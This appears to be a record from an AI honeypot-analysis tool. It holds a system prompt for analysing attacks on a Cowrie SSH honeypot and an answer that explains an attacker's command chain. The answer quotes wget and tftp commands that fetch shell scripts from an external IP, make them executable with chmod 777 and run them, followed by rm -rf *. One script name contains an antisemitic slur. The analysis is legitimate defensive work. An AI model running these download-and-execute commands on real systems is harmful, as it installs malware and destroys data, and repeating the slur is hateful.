    "answer": "Let's break down the commands:\n\n- `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /`: The attacker is trying to change the current directory to `/tmp`, `/var/run`, `/mnt`, `/root`, or the root directory(`/`). The substitution operator `||` ensures that subsequent `cd` commands get executed only if the previous one failed.\n  \n- `wget http://213.255.246.81/fuckjewishpeople.sh;`: This command downloads a shell script named `fuckjewishpeople.sh` from the IP address `213.255.246.81`.\n\n- `chmod 777 fuckjewishpeople.sh;`: The chmod command is used to change the permissions of files or directories. In this case, the command `chmod 777 fuckjewishpeople.sh` is giving read, write, and execute permissions to everyone for the file `fuckjewishpeople.sh`.\n\n- `sh fuckjewishpeople.sh;`: Executes the `fuckjewishpeople.sh` script.\n\n- `tftp 213.255.246.81 -c get tftp1.sh;`: This command uses the Trivial File Transfer Protocol (TFTP) to download another script named `tftp1.sh` from the same server.\n\n- `chmod 777 tftp1.sh; sh tftp1.sh;`: These commands give everyone read, write, and execute permissions for the file `tftp1.sh` and executes it.\n\n- `tftp -r tftp2.sh -g 213.255.246.81; chmod 777 tftp2.sh; sh tftp2.sh;`: Same functionality as previous tftp but for another script `tftp2.sh`\n\n- `rm -rf *`: This command deletes all files and folders in the current directory. The `-r` or `--recursive` option makes it delete recursively, and `-f` or `--force` option is used to ignore nonexistent files and arguments, and never prompt for anything.\n\nThe primary aim of these commands seems to be to gain a foothold on the system, possibly for further exploitation. This is achieved by downloading and executing scripts that presumably contain malicious content. However, without additional information, like the contents of the downloaded scripts, it's hard to determine with certainty what the scripts do and therefore what the attacker's specific objectives might be.",
    "system_prompt": "Your role is to answer questions about an attack on a Linux honeypot. You will analyze the commands executed, uploaded/downloaded files, HTTP requests, sessionsand other data logged during the attack to understand the methods and goals of the attacker.You will also analyze OSINT data gathered about the attacking IP(s) including: geolocation, open ports, running services, threatfeed reports and reports of known malware associated with the IP(s) to get additional context on the attack and enhance your analysis. Your answers will be used in a GitHub .md file so you should use markdown syntax to format your output. Use the available functions to request relevant information to thoroughly answer each question. You should use multiple function calls to analyze the data returned by previous function calls and to get any additional data you need to answer each question as accurately as possible. For example if you see that the attacker downloaded malware in one of the commands executed, you should use the get_attack_attrs function with the arguement 'uniq_malware' to get a list of unique malware_ids associated with the attack, then use get_malware_attrs to analyze the malware, and the query_ functions to get additional OSINT data about the malware and its source. IMPORTANT: When using get_attack_attrs use the uniq_<attr> modifier first and only get all values if necessary after analyzing the unique values. For context that the honeypot system has the following open ports: Port 2222: Cowrie SSH server running OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)  Its internal IP address is: 172.31.5.68 and its external IP address is: 54.67.87.80.
